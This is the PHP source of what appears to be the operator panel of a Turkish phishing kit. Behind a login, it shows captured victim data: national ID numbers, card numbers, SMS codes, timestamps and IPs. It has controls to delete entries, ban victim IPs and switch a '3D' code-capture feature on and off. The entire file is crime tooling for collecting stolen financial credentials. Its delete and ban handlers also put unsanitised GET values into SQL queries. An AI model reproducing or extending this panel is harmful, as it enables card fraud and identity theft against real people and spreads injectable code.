<?php
include("../connect.php");
$query=$db->prepare('SELECT * FROM logs ORDER BY id DESC');
$query->execute();
$list=$query->fetchAll(PDO::FETCH_OBJ);
session_start();
if(!isset($_SESSION["login"])){
header('Location:login.php');
}else{
    if(isset($_GET['full'])){
        if($_GET['full']==1){
            $db->query('TRUNCATE TABLE logs');
            header('Location:index.php');
        }
    }
    if(isset($_GET['delete'])){
        $id = $_GET['delete'];
        $db->query("DELETE FROM logs WHERE id={$id}");
        header('Location:index.php');
    }
     if(isset($_GET['logout'])){
        session_start();
        ob_start();
        session_unset();
        session_destroy();
        header('Location:index.php');
    }
    if(isset($_GET['unip'])){
        $unip = $_GET['unip'];
        $db->query("UPDATE logs SET status = '1' WHERE id = '{$unip}'");
        header('Location:index.php');
    }
    if(isset($_GET['backip'])){
        $backip = $_GET['backip'];
        $db->query("UPDATE logs SET status = '0' WHERE id = '{$backip}'");
        header('Location:index.php');
    }
    if(isset($_GET['d'])){
        if($_GET['d']=='1'){
        $db->query("UPDATE site SET 3d = '1' WHERE id = 1");
        header('Location:index.php');
        }
    
        if($_GET['d']=='2'){
        $db->query("UPDATE site SET 3d = '0' WHERE id = 1");
        header('Location:index.php');
        }
    }
$d=$db->prepare('SELECT * FROM site WHERE id = 1');
$d->execute();
$sys=$d->fetch(PDO::FETCH_ASSOC);
?>
<!DOCTYPE HTML>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="refresh" content="5">
    <link href="https://fonts.googleapis.com/css?family=Cute+Font|Long+Cang|Barlow&display=swap" rel="stylesheet">
    <title>SansurCoder Panel</title>
    <link rel="icon" type="image/png" href="../files/linux.png">
  </head>
  <body>
<?php $d3=$db->prepare('SELECT * FROM site WHERE id = 1');
$d3->execute();
$sys=$d3->fetch(PDO::FETCH_ASSOC); ?>
      <h2 style="color:#555;">Marge Panel<small> <span class="tooltip"><span class="tooltiptext">ICQ: @r3yd3r</span></span></small><small style="float:right;"><small>3D S&#304;STEM&#304;: <?php if($sys['3d']=='0'){?><font color="green">A&#199;IK</font> </small><a href="?d=1"><button>KAPAT</button></a><?php }elseif($sys['3d']=='1'){ ?><font color="red">KAPALI</font> </small><a href="?d=2"><button>A&#199;</button></a><?php }else{} ?> - <a href="?full=1"><button>T&#220;M&#220;N&#220; S&#304;L</button></a> <a href="?logout=1"><button>&#199;IKI&#350; YAP</button></a></small></h2>
		 <table class="table">
			<tr>
			 <td>MAIL GIRIS</td>
       <td>SIFRE</td>
			 <td>SMS</td>
			 <td>ZAMAN</td>
			 <td>IP</td>
			 <td>&#304;&#350;LEM</td>
			 </tr>
			 
			 <?php
			 foreach($list as $c1){?>
<tr>
  <td><?= $c1->tckn ?></td>
<td><?= $c1->ccnumber ?></td>
<td><?= $c1->sms ?></td>
<td><?= $c1->date ?></td>
<td><?= $c1->ip ?></td>
   <?php $statement = $db->prepare("SELECT * FROM logs WHERE id = :id");
$statement->execute(array( ":id" => $c1->id ));
$x = $statement->fetch(PDO::FETCH_ASSOC);?>
    <td><a href="?delete=<?= $c1->id ?>"><button>S&#304;L</button></a> <?php if($x['status']=='0'){?><a href="?unip=<?= $c1->id ?>"><button>IP BAN</button></a><?php }else{?><a href="?backip=<?= $c1->id ?>"><button>BAN KALDIR</button></a><?php } ?></td>
</tr>
				 
			 <?php } ?>

			</table>
	<style>
::selection{
    background:#fff88f;
    color:#111;
}
::-moz-selection{
    background:#222;
    color:#fff;
}
body{
    background: #fcfafc;
}
*{
    font-family:'Barlow', sans-serif;
}
td {
  background-color: #f2f7fa;
  border-radius: 1px;
    box-shadow: 0px 1px 3px #999;
  color: #333;
}
table {
  border-collapse: collapse;
  width: 100%;
}

th, td {
  padding: 8px;
  text-align: left;
  border-bottom: 1px solid #fff;
}

tr:hover {background-color:#f5f5f5;}
button{
  background: #f2f7fa;
  color: #333;
  height: 25px;
  box-shadow: 0px 1px 2px #ccc;
  outline: none;
  border: 0;
  cursor: pointer;
}
button:hover{
  box-shadow: 0px 1px 1px #bbb;
}
.tooltip {
  position: relative;
  display: inline-block;
}

.tooltip .tooltiptext {
  visibility: hidden;
  width: 120px;
  background-color: black;
  color: #fff;
  text-align: center;
  border-radius: 6px;
  padding: 5px 0;
  position: absolute;
  z-index: 1;
  top: 150%;
  left: 50%;
  margin-left: -60px;
}

.tooltip .tooltiptext::after {
  content: "";
  position: absolute;
  bottom: 100%;
  left: 50%;
  margin-left: -5px;
  border-width: 5px;
  border-style: solid;
  border-color: transparent transparent black transparent;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
}    
	</style>
  </body>
</html>
<?php } ?>